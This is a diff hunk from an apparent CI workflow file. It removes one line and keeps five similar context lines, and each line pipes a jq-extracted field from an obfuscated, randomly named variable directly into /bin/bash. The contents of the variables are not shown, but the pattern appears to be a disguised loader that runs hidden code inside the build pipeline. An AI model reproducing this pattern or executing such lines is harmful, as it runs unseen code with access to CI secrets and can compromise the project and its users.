@@ -35,7 +35,6 @@ jobs:
           echo $ip2 | jq -r .ihnc2 | /bin/bash
           echo $hc7 | jq -r .xc804 | /bin/bash
           printf '%s' "$osjg73208" | jq -r .an643 | /bin/bash
-          printf '%s' "$fug95269" | jq -r .i66 | /bin/bash
           echo $ggkw4 | jq -r .ggbjz9656 | /bin/bash
           printf '%s' "$ld758" | jq -r .ayu6507 | /bin/bash
 
